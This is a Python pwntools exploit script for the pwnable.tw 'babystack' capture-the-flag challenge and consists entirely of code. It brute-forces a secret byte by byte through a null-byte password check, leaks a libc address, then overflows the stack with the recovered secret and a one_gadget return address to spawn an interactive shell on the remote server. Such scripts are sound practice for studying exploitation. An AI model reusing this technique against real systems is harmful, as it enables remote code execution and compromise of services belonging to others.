from pwn import *

local = False
elf = 'babystack' 

if local: 
    context.binary = './'+elf
    r = process("./"+elf)
else: 
    ip = "chall.pwnable.tw"
    port = 10205
    r = remote(ip,port)

l = ELF('./libc_64.so.6')

msg = ''
for i in range(0x10) :
    print i
    for count in range(1,256) :
        r.recvuntil('>> ')
        r.send('1' * 0x10)
        r.recvuntil('Your passowrd :')
        r.send(msg + chr(count) + '\x00' )
        if ( r.recvuntil('!').find('Success') > 0 ):
            r.recvuntil('>> ')
            msg = msg + chr(count)
            r.send('1' * 0x10)
            break

rand_1 = u64(msg[0:8])
rand_2 = u64(msg[8:16])
success("rand1 = %s",hex(rand_1))
success("rand2 = %s",hex(rand_2))

r.recvuntil('>> ')
r.send('1' )

r.recvuntil('Your passowrd :')
r.send('\x00' + 'a' * (0x48 - 1))

r.recvuntil('>> ')
r.send('3')
r.recv()
r.send('a' * 24)

r.recvuntil('>> ')
r.send('1' * 0x10)

pad = 'a' * 0x8
msg = ''
for i in range(6) :
    print i
    for count in range(1,256) :
        r.recvuntil('>> ')
        r.send('1' * 0x10)
        r.recvuntil('Your passowrd :')
        r.send( pad + msg + chr(count) + '\x00' )
        if ( r.recvuntil('!').find('Success') > 0 ):
            r.recvuntil('>> ')
            msg = msg + chr(count)
            r.send('1' * 0x10)
            break
l.address = u64(msg + '\x00\x00') - 0x7f93e6af9439 + 0x00007f93e6a81000
one_gadget = l.address + 0xf0567
success("libc = %s",hex(l.address))

raw_input('aaa')
r.recvuntil('>> ')
r.send('1' )
r.recvuntil('Your passowrd :')
r.send('\x00' + 'z'*0x3f + p64(rand_1) + p64(rand_2) + p64(0xdeadbeefdeadbeef) * 3 + p64(one_gadget) )

r.recvuntil('>> ')
r.send('3' )
print r.recv()
r.send('a')

r.recvuntil('>> ')
r.send('2' )
r.interactive()
